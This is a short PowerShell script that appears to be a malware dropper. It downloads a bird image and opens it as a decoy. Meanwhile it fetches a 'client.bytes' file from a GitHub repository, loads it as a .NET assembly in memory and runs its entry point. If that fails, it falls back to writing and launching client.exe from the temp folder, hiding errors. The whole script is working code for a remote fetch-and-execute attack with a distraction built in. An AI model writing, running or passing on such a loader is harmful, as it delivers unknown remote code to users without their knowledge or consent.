try {
    # Download the image
    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
    
    # Open the downloaded image
    Start-Process "$env:TEMP\blue-bird.jpg"
    
    # Download the bytes file from GitHub
    $bytesUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.bytes"
    $bytesPath = "$env:TEMP\client.bytes"
    Invoke-WebRequest -Uri $bytesUrl -OutFile $bytesPath
    
    # Read the bytes file and execute in memory
    $bytes = [System.IO.File]::ReadAllBytes($bytesPath)
    
    # Create a new AppDomain to load and execute the assembly
    $customAppDomain = [System.AppDomain]::CreateDomain("ExecutionDomain")
    
    # Load and execute the bytes in memory
    $assembly = $customAppDomain.Load($bytes)
    $entryPoint = $assembly.EntryPoint
    
    # Invoke the executable's entry point
    if ($entryPoint.GetParameters().Length -eq 0) {
        $entryPoint.Invoke($null, $null)
    }
    else {
        $entryPoint.Invoke($null, (,[string[]]@()))
    }
} 
catch {
    # If the above method fails, fall back to traditional execution
    try {
        $exePath = "$env:TEMP\client.exe"
        [System.IO.File]::WriteAllBytes($exePath, $bytes)
        Start-Process $exePath -ErrorAction Stop
    }
    catch {
        # Error handling is kept minimal as per original script
    }
}